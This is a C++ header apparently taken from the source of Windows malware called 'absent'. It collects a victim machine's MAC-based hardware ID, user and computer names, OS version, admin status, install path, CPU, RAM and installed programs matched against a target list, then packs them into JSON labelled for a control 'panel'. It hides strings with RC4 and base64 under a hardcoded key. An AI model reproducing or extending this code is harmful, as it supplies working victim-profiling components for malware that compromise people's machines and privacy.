#pragma once
#include <iostream>
#include <Lmcons.h>
#include <intrin.h>
#include <list>
#include <Iphlpapi.h>
#pragma comment (lib,"Iphlpapi.lib") 

std::string k = key(0x2cb62029b6082afc);

namespace absent
{
	namespace info
	{
		class info
		{
		public:
			std::string hardwareID, userName, computerName, operatingSystem, privilege, installPath, cpu, cpuArchitecture, gpu;
			int cpuCores, ram, vram;
			std::list<std::string> installedPrograms;
			
			info( std::list<std::string> pn)
			{
				programNeedles = pn;
				getUserName();
				getComputerName();
				getOperatingSystem();
				getPrivilege();
				getInstallPath();
				getCpu();
				getCpuArchitecture();
				getCpuCores();
				getGpu();
				getRam();
				getVram();
				getHardwareID();
				getInstalledPrograms();
			}

			nlohmann::json getJson(std::string buildName, std::string buildType, std::string build)
			{
				nlohmann::json jInfo = {
					{"check", "check"}, //Check Variable for panel
					{"bn", buildName},
					{"bt", buildType},
					{"bu", build},
					{"hw", hardwareID},
					{"un", userName},
					{"cn", computerName},
					{"os", operatingSystem},
					{"pr", privilege},
					{"ip", installPath},
					{"cp", cpu},
					{"ca", cpuArchitecture},
					{"cc", std::to_string(cpuCores)},
					{"gp", gpu},
					{"ra", std::to_string(ram)},
					{"vr", std::to_string(vram)},
					{"fp", installedPrograms},
				};
				return jInfo;
			}

		private:
			std::list<std::string> programNeedles;

			void getHardwareID()
			{

				IP_ADAPTER_INFO AdapterInfo[18];
				DWORD dwBufLen = sizeof(AdapterInfo);
				DWORD dwStatus = GetAdaptersInfo(AdapterInfo, &dwBufLen);
				assert(dwStatus == ERROR_SUCCESS);
				PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
				char mac_addr[18];
				sprintf(mac_addr, "%02X-%02X-%02X-%02X-%02X-%02X", pAdapterInfo->Address[0], pAdapterInfo->Address[1], pAdapterInfo->Address[2], pAdapterInfo->Address[3], pAdapterInfo->Address[4], pAdapterInfo->Address[5]);
				hardwareID = mac_addr;
			}
			void getUserName()
			{
				char  infoBuf[32767];
				DWORD bufCharCount = 32767;
				if (GetUserNameA(infoBuf, &bufCharCount)) userName = infoBuf;
			}
			void getComputerName()
			{
				char  infoBuf[32767];
				DWORD bufCharCount = 32767;
				if (GetComputerNameA(infoBuf, &bufCharCount)) computerName = infoBuf;
			}
			void getOperatingSystem()
			{
				HMODULE hModule = LoadLibrary(TEXT("version.dll"));
				typedef DWORD(WINAPI *GetFileVersionInfoSizeProc)(LPCSTR, LPDWORD);
				typedef BOOL(WINAPI *GetFileVersionInfoProc)(LPCSTR, DWORD, DWORD, LPVOID);
				typedef BOOL(WINAPI *VerQueryValueProc)(LPCVOID, LPCSTR, LPVOID, PUINT);

				GetFileVersionInfoProc getFileVerInfo = (GetFileVersionInfoProc)GetProcAddress(hModule, "GetFileVersionInfoA");
				GetFileVersionInfoSizeProc getFileVerSize = (GetFileVersionInfoSizeProc)GetProcAddress(hModule, "GetFileVersionInfoSizeA");
				VerQueryValueProc verQueryValue = (VerQueryValueProc)GetProcAddress(hModule, "VerQueryValueA");

				DWORD  verHandle = 0;
				UINT   size = 0;
				LPBYTE lpBuffer = NULL;
				const char* szVersionFile = "kernel32.dll";
				DWORD  verSize = getFileVerSize(szVersionFile, &verHandle);
				if (verSize != NULL)
				{
					LPSTR verData = new char[verSize];

					if (getFileVerInfo(szVersionFile, verHandle, verSize, verData))
					{
						if (verQueryValue(verData, "\\", (VOID FAR* FAR*)&lpBuffer, &size))
						{
							if (size)
							{
								VS_FIXEDFILEINFO *verInfo = (VS_FIXEDFILEINFO *)lpBuffer;
								if (verInfo->dwSignature == 0xfeef04bd)
								{
									absent::crypto::RC4 rc4;
									if (((verInfo->dwFileVersionMS >> 16) & 0xffff) == 10 && ((verInfo->dwFileVersionMS >> 0) & 0xffff) == 0) operatingSystem = rc4.crypt(absent::crypto::b64::decode("9Qmskf2FqzW7Dw=="), k);
									if (((verInfo->dwFileVersionMS >> 16) & 0xffff) == 6 && ((verInfo->dwFileVersionMS >> 0) & 0xffff) == 3)  operatingSystem = rc4.crypt(absent::crypto::b64::decode("9Qmskf2FqzWyERo="), k);
									if (((verInfo->dwFileVersionMS >> 16) & 0xffff) == 6 && ((verInfo->dwFileVersionMS >> 0) & 0xffff) == 2)  operatingSystem = rc4.crypt(absent::crypto::b64::decode("9Qmskf2FqzWy"), k);
									if (((verInfo->dwFileVersionMS >> 16) & 0xffff) == 6 && ((verInfo->dwFileVersionMS >> 0) & 0xffff) == 1)  operatingSystem = rc4.crypt(absent::crypto::b64::decode("9Qmskf2FqzW9"), k);
									if (((verInfo->dwFileVersionMS >> 16) & 0xffff) == 6 && ((verInfo->dwFileVersionMS >> 0) & 0xffff) == 0)  operatingSystem = rc4.crypt(absent::crypto::b64::decode("9Qmskf2FqzXcVlg+AQ=="), k);
									if (((verInfo->dwFileVersionMS >> 16) & 0xffff) == 5 && ((verInfo->dwFileVersionMS >> 0) & 0xffff) == 2)  operatingSystem = rc4.crypt(absent::crypto::b64::decode("9Qmskf2FqzXSbwt8VHv4/6MQI5phqc/fCg=="), k);
									if (((verInfo->dwFileVersionMS >> 16) & 0xffff) == 5 && ((verInfo->dwFileVersionMS >> 0) & 0xffff) == 1)  rc4.crypt(absent::crypto::b64::decode("9Qmskf2FqzXSbw=="), k);
								}
							}
						}
					}
					delete[] verData;
				}
				FreeLibrary(hModule);
			}
			void getPrivilege()
			{
				BOOL fRet = FALSE;
				HANDLE hToken = NULL;
				if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
					TOKEN_ELEVATION Elevation;
					DWORD cbSize = sizeof(TOKEN_ELEVATION);
					if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) fRet = Elevation.TokenIsElevated;
				}
				if (hToken) CloseHandle(hToken);
				privilege = "User";
				if (fRet) privilege = "Admin";
			}
			void getInstallPath()
			{
				char result[MAX_PATH];
				GetModuleFileNameA(NULL, result, MAX_PATH);
				installPath = result;
			}
			void getCpu()
			{
				int CPUInfo[4] = { -1 };
				unsigned   nExIds, i = 0;
				char CPUBrandString[0x40];
				// Get the information associated with each extended ID.
				__cpuid(CPUInfo, 0x80000000);
				nExIds = CPUInfo[0];
				for (i = 0x80000000; i <= nExIds; ++i)
				{
					__cpuid(CPUInfo, i);
					// Interpret CPU brand string
					if (i == 0x80000002)
						memcpy(CPUBrandString, CPUInfo, sizeof(CPUInfo));
					else if (i == 0x80000003)
						memcpy(CPUBrandString + 16, CPUInfo, sizeof(CPUInfo));
					else if (i == 0x80000004)
						memcpy(CPUBrandString + 32, CPUInfo, sizeof(CPUInfo));
				}
				//string includes manufacturer, model and clockspeed
				cpu = CPUBrandString;
			}
			void getCpuArchitecture()
			{
				BOOL bIsWow64 = FALSE;
				typedef BOOL(APIENTRY *LPFN_ISWOW64PROCESS)(HANDLE, PBOOL);
				LPFN_ISWOW64PROCESS fnIsWow64Process;
				HMODULE module = GetModuleHandleA("kernel32");
				const char funcName[] = "IsWow64Process";
				fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(module, funcName);
				if (NULL != fnIsWow64Process) if (!fnIsWow64Process(GetCurrentProcess(), &bIsWow64));
				cpuArchitecture = "32 Bit";
				if (bIsWow64 != FALSE) cpuArchitecture = "64 Bit";
			}
			void getCpuCores()
			{
				SYSTEM_INFO sysInfo;
				GetSystemInfo(&sysInfo);
				cpuCores = sysInfo.dwNumberOfProcessors;
			}
			void getGpu()
			{

			}
			void getRam()
			{
				MEMORYSTATUSEX statex;
				statex.dwLength = sizeof(statex);
				GlobalMemoryStatusEx(&statex);
				ram = (statex.ullTotalPhys / 1024) / 1024;
			}
			void getVram()
			{

			}

			void getInstalledPrograms()
			{
				HKEY hUninstKey = NULL;
				HKEY hAppKey = NULL;
				char sAppKeyName[1024];
				char sSubKey[1024];
				
				char sDisplayName[1024];
				const char *sRoot = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall";
				long lResult = ERROR_SUCCESS;
				DWORD dwType = KEY_ALL_ACCESS;
				DWORD dwBufferSize = 0;

				//Open the "Uninstall" key.
				if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, sRoot, 0, KEY_READ, &hUninstKey) != ERROR_SUCCESS) return;

				for (DWORD dwIndex = 0; lResult == ERROR_SUCCESS; dwIndex++)
				{
					//Enumerate all sub keys...
					dwBufferSize = sizeof(sAppKeyName);
					if ((lResult = RegEnumKeyExA(hUninstKey, dwIndex, sAppKeyName, &dwBufferSize, NULL, NULL, NULL, NULL)) == ERROR_SUCCESS)
					{
						//Open the sub key.
						sprintf(sSubKey, "%s\\%s", sRoot, sAppKeyName);
						if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, sSubKey, 0, KEY_READ, &hAppKey) != ERROR_SUCCESS)
						{
							RegCloseKey(hAppKey);
							RegCloseKey(hUninstKey);
							return;
						}

						//Get the display name value from the application's sub key.
						dwBufferSize = sizeof(sDisplayName);
						if (RegQueryValueExA(hAppKey, "DisplayName", NULL, &dwType, (unsigned char*)sDisplayName, &dwBufferSize) == ERROR_SUCCESS)
						{
							std::string name(sDisplayName);
							for (std::string i : programNeedles)
							{
								if (name.find(i) != std::string::npos)
								{
									installedPrograms.push_back(name);
								}
							}
						}
						else {
							//Display name value doe not exist, this application was probably uninstalled.
						}

						RegCloseKey(hAppKey);
					}
				}

				RegCloseKey(hUninstKey);

				return;
			}
		};
	}
}